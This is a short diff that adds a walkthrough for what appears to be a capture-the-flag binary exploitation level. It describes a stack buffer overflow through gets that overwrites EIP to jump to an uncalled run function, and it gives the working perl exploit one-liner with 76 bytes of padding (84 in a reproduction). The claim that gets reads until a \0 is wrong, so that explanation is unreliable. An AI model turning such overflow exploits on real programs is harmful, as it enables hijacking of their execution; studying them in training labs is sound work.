@@ -1,0 +1,7 @@
+1. We saw the usage of gets that is unsafe because it write STDIN until it finds a \0
+2. We saw the run function uncalled by the main function
+3. We built a payload to write in the buffer and override EIP with the first instruction of the run function
+4. This is the exploit (perl -e 'print "1"x76 . "\x44\x84\x04\x08"' ; cat) | ./level1
+
+---
+In our reproduction, this is the same payload but with a padding size of 84
